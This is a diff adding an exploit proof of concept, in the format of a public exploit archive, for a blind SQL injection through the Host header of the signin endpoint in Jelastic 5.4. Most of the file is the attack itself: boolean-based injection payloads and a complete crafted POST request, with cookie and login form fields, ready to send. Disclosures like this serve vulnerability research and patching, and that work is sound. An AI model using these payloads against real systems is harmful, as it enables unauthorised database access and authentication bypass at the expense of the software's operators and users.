@@ -1,0 +1,34 @@
+# Exploit Title: Jelastic 5.4 - 'host' SQL injection
+# Google Dork: N/A
+# Date: [date]
+# Exploit Author: Procode701
+# Vendor Homepage: https://jelastic.com/
+# Software Link: https://jelastic.com/
+# Version: 5.4
+# Tested on: [Kali Linux]
+# CVE : N/A
+
+# POC: 
+# The application /1.0/users/authentication/rest/signin is vulnerable to SQL injection.
+# Vulnerable application Header field: Host:' AND 8494=8494-- ttWV
+
+# EXPLOIT POC :
+# Parameter: Host #1* ((custom) HEADER)
+#     Type: boolean-based blind
+#     Payload:' AND 8494=8494-- ttWV
+# PAYLOAD: ' AND 8494=8494-- ttWV
+
+POST /1.0/users/authentication/rest/signin HTTP/1.1
+Host: localhost'-8564' OR 8495=8495-- yjRM--delay=0
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0
+Accept: */*
+Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: https://localhost
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Content-Length: 128
+Cookie: GLang=en; GLocale=en-us; jrouter=b916bf4d3b39e6029fd403f21566f3f1
+DNT: 1
+Connection: close
+
+charset=UTF-8&hx_lang=en&session=1&ruk=cccc5e05-c0cb-4419-8a34-tab606191&email=testing%40gg.com&password=testing&appid=dashboard
